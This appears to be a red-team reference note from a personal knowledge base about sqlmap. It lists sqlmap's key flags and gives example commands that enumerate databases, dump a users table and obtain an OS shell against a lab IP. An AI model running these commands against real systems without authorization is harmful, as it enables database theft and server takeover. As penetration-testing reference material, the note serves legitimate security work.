---
type: tool
room: red
tool_name: "sqlmap"
version: "v1.8.x"
platform: [Linux, Windows, macOS]
phase: [Exploitation, Credential Access]
tags: [red/tool, red/web, sqli, database-dump, os-shell]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# sqlmap

> [!quote]
> *"Eliminate all other factors, and the one which remains must be the truth."*
> — *The Sign of the Four*

**Room:** Red — Instruments | **Phase(s):** `Exploitation, Credential Access` | **Platform:** `Linux, Windows, macOS`

---

## The Instrument *(What It Is)*

`sqlmap` is an open-source automated penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities and the takeover of database servers. It supports fingerprinting, data dumping, file reading/writing, and out-of-band shell execution across MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and more.

- **Author / Origin:** Bernardo Damele A. G. & Miroslav Stampar
- **License:** GNU GPL v2
- **Install:** `sudo apt install sqlmap`

---

## The Method *(Core Usage)*

### Basic Syntax
```bash
sqlmap -u "<target_url>" [options]
sqlmap -r <request_file.txt> [options]
```

### Key Flags

| Flag | Meaning |
|------|---------|
| `-u <url>` | Target URL |
| `-r <file>` | Load HTTP request from a saved file (e.g. exported from Burp) |
| `--data=<str>` | POST data string |
| `--cookie=<str>` | HTTP Cookie header value for authenticated testing |
| `--batch` | Non-interactive mode (automatically answers default to prompts) |
| `--dbs` | Enumerate DBMS databases |
| `--tables` | Enumerate DBMS database tables |
| `-D <db> -T <tbl> --dump` | Dump table entries |
| `--os-shell` | Prompt for an interactive operating system shell (requires DBA rights) |
| `--level=<1-5>` | Level of tests to perform (1=default, 5=exhaustive headers & cookies) |
| `--risk=<1-3>` | Risk of tests to perform (1=default, 3=riskier heavy OR-based injections) |
| `--threads=<num>` | Max number of concurrent HTTP(S) requests (max 10) |
| `--tamper=<script>` | Use evasion script to bypass WAF/filters (e.g. `space2comment`) |

---

## The Cases *(Common Use-Patterns)*

### Case 1 — Standard GET Parameter Testing & Database Enumeration
```bash
# Test GET parameter and enumerate available databases
sqlmap -u "http://10.10.10.50/view.php?id=1" --batch --dbs
```

### Case 2 — Authenticated Dump from Saved Burp Request
```bash
# Parse full HTTP request file exported from Burp and dump users table
sqlmap -r burp_post_request.txt -D app_db -T users --dump --batch
```

### Case 3 — Gaining an Interactive OS Shell
```bash
# Attempt database-to-OS shell breakout (e.g. xp_cmdshell, MySQL UDF, pg_exec)
sqlmap -u "http://10.10.10.50/page.php?id=1" --os-shell --batch
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1190` | Exploit Public-Facing Application |
| `T1505.003` | Server Software Component: Web Shell |

---

## Gotchas & Caveats

> [!warning] Common Mistakes
> - **CSRF / Anti-Automation Tokens:** When testing login pages with dynamic CSRF tokens, pass `--csrf-token="token_name"` so sqlmap automatically refreshes the token with each attempt.

---

## Related Notes

- [[Red/Instruments/burpsuite|Burp Suite]]
- [[Red/Monographs/TA0001 - Initial Access|TA0001 — Initial Access]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
